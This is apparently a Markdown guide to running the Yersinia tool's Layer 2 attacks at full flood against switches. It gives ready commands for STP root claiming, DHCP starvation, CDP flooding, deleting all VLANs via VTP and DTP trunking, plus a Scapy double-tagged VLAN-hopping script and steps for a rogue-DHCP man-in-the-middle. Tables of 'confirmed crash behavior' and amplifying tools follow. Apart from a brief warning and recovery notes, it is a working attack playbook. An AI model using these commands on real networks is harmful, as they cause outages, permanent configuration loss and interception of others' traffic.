⚠️ **Warning**: Even in isolated environments, full-volume Layer 2 flooding can:

* Crash virtual and physical switches (especially older Cisco devices)
* Trigger broadcast storms and CPU lock-ups
* Disrupt even the attacker's NIC if the kernel can't handle the load

---

## 🎯 Yersinia Full-Flood Attacks Per Protocol

---

### 🌀 **STP (Spanning Tree Protocol)**

#### 📍 Attack: **BPDU Flood & Root Claim**

Yersinia floods BPDUs with low bridge IDs to **become Root Bridge**, or floods to disrupt topology.

#### 🔧 Command (No Rate Limit):

```bash
sudo yersinia -I
```

→ Press `G` → Select STP
→ Press `X` → Choose attack: `Send BPDU with lowest priority (claim root)`
→ Repeat rapidly with `Enter` or script:

```bash
sudo yersinia stp -attack 1 -interface eth0 -loop 100000
```

#### 🔥 Effect:

* Switches may re-elect attacker as Root every few ms
* Topology flaps continuously → **high CPU** on L2 devices
* May cause **intermittent or total LAN outage**

---

### 🧨 **DHCP Starvation**

#### 📍 Attack: **DISCOVER Flood (Exhaust DHCP Pool)**

#### 🔧 Command:

```bash
sudo yersinia dhcp -attack 1 -interface eth0 -loop 100000
```

* Attack 1 = `DISCOVER Flood`
* Use `-loop` to remove limits

#### 🔥 Effect:

* DHCP server runs out of leases
* New victims can't connect to network
* Causes serious degradation in VM networks (even on VirtualBox/VMware)

---

### 🚩 **CDP Flood**

#### 📍 Attack: **CDP Neighbor Table Overload**

#### 🔧 Command:

```bash
sudo yersinia cdp -attack 1 -interface eth0 -loop 100000
```

* Attack 1 = CDP advertisement
* Each packet spoofs a new device (random hostname/MAC)

#### 🔥 Effect:

* Cisco switch neighbor table fills → old entries purged
* Logs spammed → sometimes causes memory leak / crash on small switches

---

### 🧼 **VTP Delete All VLANs**

#### 📍 Attack: **VTP Vlan Delete**

#### ⚠️ Dangerous:

```bash
sudo yersinia vtp -attack 2 -interface eth0
```

* Attack 2 = Delete all VLANs on trunked switch
* Will **erase VLAN DB** on VTP server (CatOS/IOS)

#### 🔥 Effect:

* Segmentation failure
* All VLANs disappear → traffic drops
* Requires manual recovery (`vlan.dat`)

---

### 🧰 **DTP Trunk Attack + VLAN Hopping**

#### 📍 Step 1: Enable Trunking

```bash
sudo yersinia dtp -attack 1 -interface eth0
```

Now your attacker port becomes a trunk.

#### 📍 Step 2: Send double-tagged packets

Use Scapy or custom tool to craft **double 802.1Q headers**:

```python
from scapy.all import *

frame = Ether(dst="ff:ff:ff:ff:ff:ff") / \
        Dot1Q(vlan=1) / \
        Dot1Q(vlan=20) / \
        IP(dst="192.168.20.1") / \
        ICMP()

sendp(frame, iface="eth0", count=100000)
```

#### 🔥 Effect:

* Bypasses VLAN segregation if native VLANs are misconfigured
* Triggers logging overload or forwarding loops

---

### 🧠 Advanced: Combine DHCP Starvation + Rogue Server + MITM

1. Launch Yersinia DHCP starvation flood (as above)
2. Start rogue DHCP server (e.g., using `dnsmasq` or `dhcpd`)
3. Set attacker as:

   * Gateway: `option routers`
   * DNS: `option domain-name-servers`
4. Victim gets poisoned config → All traffic routes through attacker

---

## 🧪 Traffic Verification

Use `tcpdump` to confirm attack load:

```bash
sudo tcpdump -i eth0 stp or dhcp or vlan
```

Use `htop` or `iftop` to see CPU/NIC load in real time.

---

## 🧯 Recovery & Safety

* Reboot affected VMs or switches
* Delete `/etc/dhcp/dhcpd.leases` if DHCP breaks
* Restart `NetworkManager` on Linux victims
* Use `brctl showstp` or `spanning-tree` commands on switches to confirm new root

---

## 🧰 Optional Tools to Amplify

| Tool        | Role                                  | Use With Yersinia? |
| ----------- | ------------------------------------- | ------------------ |
| `scapy`     | Craft custom VLAN/MPLS/802.1x         | Yes                |
| `ettercap`  | Combine MITM with STP/DHCP            | Yes                |
| `tcpreplay` | Replay attack PCAPs at full line rate | Yes                |
| `macof`     | Flood switch with fake MACs           | Yes                |

---

## 📌 Summary: “Go Full Flood” Map

| Protocol | Flood Attack            | Tool             | Confirmed Crash Behavior            |
| -------- | ----------------------- | ---------------- | ----------------------------------- |
| STP      | Claim root + BPDU flood | Yersinia         | Switch CPU 100%, packet loss        |
| DHCP     | Starvation              | Yersinia         | IP exhaustion, service crash        |
| CDP      | Table overflow          | Yersinia         | CDP daemon crash on older Cisco     |
| VTP      | Delete all VLANs        | Yersinia         | Permanent config loss               |
| DTP      | Enable trunk, send tags | Yersinia + Scapy | VLAN isolation failure              |
| MAC      | MAC flood               | macof            | CAM table overflow, broadcast storm |

---
